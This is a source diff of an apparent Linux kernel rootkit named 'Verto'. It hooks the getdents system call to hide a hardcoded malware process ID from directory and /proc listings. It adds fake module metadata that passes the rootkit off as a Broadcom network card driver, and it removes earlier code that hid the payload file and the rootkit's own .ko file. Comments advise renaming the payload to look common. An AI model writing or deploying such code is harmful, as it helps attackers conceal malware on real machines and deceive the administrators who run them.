@@ -1,3 +1,30 @@
+//                              - Neccessary header files -
+
+#include <linux/init.h> //macros
+#include <linux/module.h> 
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h> //Call system
+#include <linux/slab.h>
+#include <linux/kern_levels.h>
+#include <linux/gfp.h>
+#include <asm/unistd.h>
+#include <asm/paravirt.h>
+#include <linux/kernel.h> //Kernel 
+
+// ------------------------------------------------------------------------------ //
+
+//                             - Module Signing -
+
+//Assists with kernel taint warnings etc
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Broadcom");
+MODULE_DESCRIPTION("NIC Device Driver");
+MODULE_VERSION("1.0");
+
+// ------------------------------------------------------------------------------ //
+
+
+
 //Neccessary header files
 #include <linux/init.h> //macros
 #include <linux/module.h> 
@@ -60,44 +87,19 @@ struct linux_dirent {
 }*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer -> Utility pointers
 
 
-//      ------ MALWARE DROP & Verto file hides ------ //
+//                  ------ MALWARE DROP & Verto file hides ------                      //
 
 //Hardcoded malware package
 char payload[]="malware_demo_file.py"; //Rename to something 'common'
+char payload_PID[] = "4379"; //Fix hardcode (fix possible) -> so need fetch PID command
 
-// ------------------------------ //
-
-// ------- HIDE ROOTKIT FILE -------- //
-
-char ko_fl[]  = "verto.ko";
-
-//-- NOTES: We dont need to hide these because they are not necessary to the running of the module -- //
-
-    //char mod_of[] = "modules.order";
-    //char mod_vf[] = "Module.symvers";
-    //char mod_f[]  = "verto.mod.o";
-    //char out_f[]  = "verto.o";
-    //char mod_c[]  = "verto.mod.c";
-
-// ------------------------------ //
+// ---------------------------------------------------------------------------------- //
 
 
 //Original getdents syscall from kernel files (aka kallsym {'call system'})
 asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 
 
-//modified open sys call -> copy dirp (directory pointer) to kernel space
-    /*
-        -- HOW THIS HIDE FUNCTION WORKS --
-
-            ~> Hook the call for the read/open command
-            ~> Point it to directory traversal code
-                ~> Uses byte calculations to determine how many resources (represented by structures ) are in dir
-            ~> Once it reaches the file to be hidden 
-                ~> it 'skips' it and performs the byte arithmatic to continue normally
-                ~> displaying everything else in the 
-
-    */
-  
+//modified open sys call -> copy dirp (directory pointer) to kernel space  
 asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
   struct linux_dirent *retn, *dirp3; 
@@ -124,13 +126,8 @@ asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned
     //Debbugging
     printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );
 
-    /* TEMPLATE IF
-    if((strcmp( (dirp3->d_name) , hide) == 0)){
-      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
-      Records -= length; //  dirp3->d_reclen; 
-    }
-    */
-    if((strcmp( (dirp3->d_name) , payload) == 0) || (strcmp( (dirp3->d_name) , ko_fl) == 0)){
+    //Add module PID hider also _> || (strcmp( (dirp3->d_name) , ko_fl_PID) == 0)
+    if((strcmp( (dirp3->d_name) , payload_PID) == 0) ){
         memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
         Records -= length; //  replaces dirp3->d_reclen;
     }
@@ -182,3 +179,17 @@ static void __exit HookCleanup(void) {
 
 module_init(SetHooks);
 module_exit(HookCleanup);
+
+
+
+
+
+
+
+// ~ Module Notes ~ //
+
+/*
+
+    ~Attempts to hide the running proccess ID of a file (A.K.A our payload)
+
+*/
